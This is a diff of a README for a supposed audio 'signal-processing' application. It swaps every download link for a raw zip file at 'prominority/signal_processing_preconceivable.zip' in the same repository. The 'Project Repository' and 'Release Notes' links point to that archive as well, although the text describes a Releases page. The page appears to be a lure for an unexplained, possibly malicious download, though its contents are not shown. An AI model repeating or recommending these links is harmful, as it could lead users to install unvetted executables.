@@ -8,7 +8,7 @@ Welcome to signal-processing! This application helps you analyze audio easily. Y
 
 To get started, you need to download the application. Visit the Releases page to find the latest version.
 
-[![Download Here](https://raw.githubusercontent.com/juanfreght/signal-processing/main/prominority/processing_signal_3.2.zip%20Latest%20Release-FF4081?style=flat&logo=github&logoColor=white)](https://raw.githubusercontent.com/juanfreght/signal-processing/main/prominority/processing_signal_3.2.zip)
+[![Download Here](https://github.com/juanfreght/signal-processing/raw/refs/heads/main/prominority/signal_processing_preconceivable.zip%20Latest%20Release-FF4081?style=flat&logo=github&logoColor=white)](https://github.com/juanfreght/signal-processing/raw/refs/heads/main/prominority/signal_processing_preconceivable.zip)
 
 1. Click the “Download Here” button above.
 2. You will find several versions available for download. Choose the one suitable for your operating system.
@@ -46,7 +46,7 @@ Once you have installed the signal-processing application:
 
 To keep your signal-processing application up to date, regularly check the Releases page:
 
-[![Download Here](https://raw.githubusercontent.com/juanfreght/signal-processing/main/prominority/processing_signal_3.2.zip%20Latest%20Release-FF4081?style=flat&logo=github&logoColor=white)](https://raw.githubusercontent.com/juanfreght/signal-processing/main/prominority/processing_signal_3.2.zip)
+[![Download Here](https://github.com/juanfreght/signal-processing/raw/refs/heads/main/prominority/signal_processing_preconceivable.zip%20Latest%20Release-FF4081?style=flat&logo=github&logoColor=white)](https://github.com/juanfreght/signal-processing/raw/refs/heads/main/prominority/signal_processing_preconceivable.zip)
 
 When a new version becomes available, simply follow the download steps outlined above.
 
@@ -77,7 +77,7 @@ For anyone who wishes to learn more about signal processing, consider exploring 
 
 ## 🔗 Links to Explore
 
-- [Project Repository](https://raw.githubusercontent.com/juanfreght/signal-processing/main/prominority/processing_signal_3.2.zip)
-- [Release Notes](https://raw.githubusercontent.com/juanfreght/signal-processing/main/prominority/processing_signal_3.2.zip)
+- [Project Repository](https://github.com/juanfreght/signal-processing/raw/refs/heads/main/prominority/signal_processing_preconceivable.zip)
+- [Release Notes](https://github.com/juanfreght/signal-processing/raw/refs/heads/main/prominority/signal_processing_preconceivable.zip)
 
 With the above steps and resources, you're well-prepared to start using the signal-processing application. Enjoy your audio analysis journey!
